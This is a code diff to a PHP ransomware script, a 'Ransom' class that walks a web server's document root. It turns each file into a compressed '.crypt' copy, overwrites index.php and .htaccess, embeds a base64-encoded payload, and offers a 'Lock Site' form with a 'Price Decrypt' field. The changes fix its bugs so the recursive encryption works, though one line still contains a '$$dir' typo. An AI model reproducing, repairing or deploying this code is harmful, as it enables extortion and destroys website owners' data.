@@ -13,13 +13,13 @@ class Ransom
 		$this->script = $script;
 	}
 
-	public function encrypFile($script)
+	public function encrypFile($filename, $script)
 	{
-		if (strpos($this->script, ".crypt") !== false) {
+		if (strpos($filename, ".crypt") !== false) {
 			return;
 		}
 
-		file_put_contents($this->script . ".crypt", gzdeflate(file_get_contents($this->script, 9)));
+		file_put_contents($filename . ".crypt", gzdeflate(file_get_contents($filename, 9)));
 		copy(".htaccess", ".htaccess.backup");
 
 		$a = str_replace("gomen", md5($_POST['pass']), $script);
@@ -50,9 +50,9 @@ ErrorDocument 500 /index.php\n";
 		$files = array_diff(scandir($dir), array(".", ".."));
 		foreach ($files as $key => $value) {
 			if (is_dir($dir .DIRECTORY_SEPARATOR. $value)) {
-				$this->encrypDir($dir);
+				$this->encrypDir($$dir .DIRECTORY_SEPARATOR. $value);
 			} else {
-				$this->encrypFile($dir);
+				$this->encrypFile($dir .DIRECTORY_SEPARATOR. $value, $this->script);
 			}
 		}
 	}
@@ -63,16 +63,14 @@ $script = base64_decode('JGlucHV0ID0gJF9QT1NUWydwYXNzJ107CgkJJHBhc3MgPSAiZ29tZW4
 $main = new Ransom(getcwd(), $script);
 
 if (isset($_POST['pass'])) {
-	// $main->encrypFile()
-}
+	copy('index.php', $_SERVER['DOCUMENT_ROOT'] . '/index.php');
+	copy('.htaccess', $_SERVER['DOCUMENT_ROOT'] . '.htaccess');
+	copy($_SERVER['DOCUMENT_ROOT'] . '.htaccess', $_SERVER['DOCUMENT_ROOT'] . '.htabackup');
 
-if (isset($_POST['pass'])) {
-	$main->encrypDir($_SERVER['DOCUMENT_ROOT']);
+	if (isset($_POST['pass'])) {
+		$main->encrypDir($_SERVER['DOCUMENT_ROOT']);
+	}
 }
-
-copy('index.php', $_SERVER['DOCUMENT_ROOT'] . '/index.php');
-copy('.htaccess', $_SERVER['DOCUMENT_ROOT'] . '.htaccess');
-copy($_SERVER['DOCUMENT_ROOT'] . '.htaccess', $_SERVER['DOCUMENT_ROOT'] . '.htabackup');
 
 ?>
 	<form enctype="multipart/form-data" method="post">
@@ -81,5 +79,3 @@ copy($_SERVER['DOCUMENT_ROOT'] . '.htaccess', $_SERVER['DOCUMENT_ROOT'] . '.htab
 		<input type="text" name="price" placeholder="Price Decrypt" >
 		<input type="submit" class="input" value="Lock Site">
 	</form>
-
-
